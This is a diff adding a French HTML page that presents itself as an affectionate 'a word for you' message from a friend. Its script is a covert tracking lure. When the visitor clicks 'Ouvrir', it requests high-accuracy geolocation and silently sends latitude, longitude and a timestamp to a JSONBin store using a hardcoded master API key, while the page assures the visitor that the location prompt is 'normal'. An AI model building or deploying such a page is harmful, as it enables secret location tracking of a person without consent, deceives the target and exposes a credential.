@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pour toi 💛</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400&family=DM+Sans:wght@300;400&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --cream: #F5F0E8;
+      --ink: #1A1612;
+      --gold: #C9A84C;
+      --gold-light: #E8D5A3;
+      --muted: #8A7D6B;
+    }
+
+    html, body {
+      height: 100%;
+      background: var(--cream);
+      color: var(--ink);
+      font-family: 'DM Sans', sans-serif;
+      overflow: hidden;
+    }
+
+    /* Grain overlay */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 1000;
+      opacity: 0.4;
+    }
+
+    /* Decorative corner lines */
+    .corner {
+      position: fixed;
+      width: 60px;
+      height: 60px;
+      z-index: 10;
+    }
+    .corner::before, .corner::after {
+      content: '';
+      position: absolute;
+      background: var(--gold);
+      opacity: 0.6;
+    }
+    .corner::before { width: 1px; height: 100%; }
+    .corner::after { width: 100%; height: 1px; }
+    .corner.tl { top: 24px; left: 24px; }
+    .corner.tr { top: 24px; right: 24px; transform: scaleX(-1); }
+    .corner.bl { bottom: 24px; left: 24px; transform: scaleY(-1); }
+    .corner.br { bottom: 24px; right: 24px; transform: scale(-1); }
+
+    /* Screens */
+    .screen {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 24px;
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+    .screen.hidden {
+      opacity: 0;
+      pointer-events: none;
+      transform: translateY(20px);
+    }
+
+    /* ---- SCREEN 1: Welcome ---- */
+    #screen-welcome {
+      gap: 40px;
+      text-align: center;
+    }
+    .welcome-eyebrow {
+      font-family: 'DM Sans', sans-serif;
+      font-size: 11px;
+      font-weight: 300;
+      letter-spacing: 0.3em;
+      text-transform: uppercase;
+      color: var(--gold);
+    }
+    .welcome-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: clamp(2.8rem, 8vw, 5rem);
+      font-weight: 300;
+      font-style: italic;
+      line-height: 1.05;
+      color: var(--ink);
+    }
+    .welcome-title span {
+      color: var(--gold);
+    }
+    .welcome-sub {
+      font-size: 13px;
+      font-weight: 300;
+      color: var(--muted);
+      line-height: 1.7;
+      max-width: 280px;
+      margin: 0 auto;
+    }
+    .btn-accept {
+      margin-top: 8px;
+      padding: 14px 40px;
+      background: var(--ink);
+      color: var(--cream);
+      border: none;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 12px;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.2s;
+    }
+    .btn-accept::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: var(--gold);
+      transform: translateX(-101%);
+      transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .btn-accept:hover::after { transform: translateX(0); }
+    .btn-accept:hover { transform: translateY(-1px); }
+    .btn-accept span { position: relative; z-index: 1; }
+
+    .geo-note {
+      font-size: 11px;
+      color: var(--muted);
+      opacity: 0.7;
+    }
+
+    /* ---- SCREEN 2: Loading ---- */
+    #screen-loading {
+      gap: 20px;
+    }
+    .loader-ring {
+      width: 48px;
+      height: 48px;
+      border: 1px solid var(--gold-light);
+      border-top-color: var(--gold);
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 1.1rem;
+      color: var(--muted);
+    }
+
+    /* ---- SCREEN 3: Message ---- */
+    #screen-message {
+      gap: 0;
+      text-align: center;
+    }
+    .msg-card {
+      max-width: 420px;
+      width: 100%;
+      padding: 52px 40px;
+      border: 1px solid var(--gold-light);
+      background: rgba(245, 240, 232, 0.7);
+      backdrop-filter: blur(8px);
+      position: relative;
+      animation: fadeUp 1s ease both;
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .msg-card::before {
+      content: '';
+      position: absolute;
+      top: -1px; left: 40px; right: 40px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--gold), transparent);
+    }
+    .msg-icon {
+      font-size: 2rem;
+      margin-bottom: 28px;
+      animation: pulse 3s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+    .msg-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: clamp(1.5rem, 5vw, 2.2rem);
+      font-weight: 300;
+      font-style: italic;
+      margin-bottom: 24px;
+      line-height: 1.2;
+    }
+    .msg-divider {
+      width: 40px;
+      height: 1px;
+      background: var(--gold);
+      margin: 0 auto 28px;
+    }
+    .msg-body {
+      font-size: 14px;
+      font-weight: 300;
+      line-height: 1.9;
+      color: var(--muted);
+    }
+    .msg-body strong {
+      color: var(--ink);
+      font-weight: 400;
+    }
+    .msg-signature {
+      margin-top: 36px;
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 1rem;
+      color: var(--gold);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="corner tl"></div>
+  <div class="corner tr"></div>
+  <div class="corner bl"></div>
+  <div class="corner br"></div>
+
+  <!-- SCREEN 1 -->
+  <div class="screen" id="screen-welcome">
+    <p class="welcome-eyebrow">Quelque chose t'attend</p>
+    <h1 class="welcome-title">Un mot,<br>pour <span>toi</span></h1>
+    <p class="welcome-sub">Clique pour découvrir ce que je voulais te dire depuis longtemps.</p>
+    <button class="btn-accept" onclick="startExperience()">
+      <span>Ouvrir ✦</span>
+    </button>
+    <p class="geo-note">Ton navigateur pourrait demander ta position — c'est normal.</p>
+  </div>
+
+  <!-- SCREEN 2 -->
+  <div class="screen hidden" id="screen-loading">
+    <div class="loader-ring"></div>
+    <p class="loader-text">Un instant…</p>
+  </div>
+
+  <!-- SCREEN 3 -->
+  <div class="screen hidden" id="screen-message">
+    <div class="msg-card">
+      <div class="msg-icon">💛</div>
+      <h2 class="msg-title">Tu comptes vraiment beaucoup.</h2>
+      <div class="msg-divider"></div>
+      <p class="msg-body">
+        Il y a des personnes qu'on croise et qui <strong>changent quelque chose en nous</strong>
+        sans même s'en rendre compte.<br><br>
+        Toi, tu es de celles-là.<br><br>
+        Merci d'être présent·e, d'être toi, exactement comme tu es.
+        Dans les moments simples comme dans les moments difficiles,
+        <strong>ta présence est un cadeau</strong>.
+      </p>
+      <p class="msg-signature">— Ton ami(e) qui pense à toi 🌿</p>
+    </div>
+  </div>
+
+  <script>
+    // ════════════════════════════════════════
+    //  CONFIG — remplace par tes vraies valeurs
+    // ════════════════════════════════════════
+    const JSONBIN_BIN_ID  = '69dd06c3856a6821892c67e7';
+    const JSONBIN_API_KEY = '$2a$10$.36nNBRUdpE3TtbHXEHEGunOtJSZuVMN9.JO8iefwRLUZ09KoBMIG';
+    // ════════════════════════════════════════
+
+    function show(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+    }
+
+    async function sendPosition(lat, lng) {
+      try {
+        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': JSONBIN_API_KEY
+          },
+          body: JSON.stringify({
+            lat,
+            lng,
+            timestamp: new Date().toISOString(),
+            status: 'friend_arrived'
+          })
+        });
+      } catch (e) {
+        console.warn('Position non envoyée :', e);
+      }
+    }
+
+    function startExperience() {
+      show('screen-loading');
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            await sendPosition(pos.coords.latitude, pos.coords.longitude);
+            show('screen-message');
+          },
+          () => {
+            // Refus géo → on affiche quand même le message
+            show('screen-message');
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      } else {
+        show('screen-message');
+      }
+    }
+  </script>
+</body>
+</html>
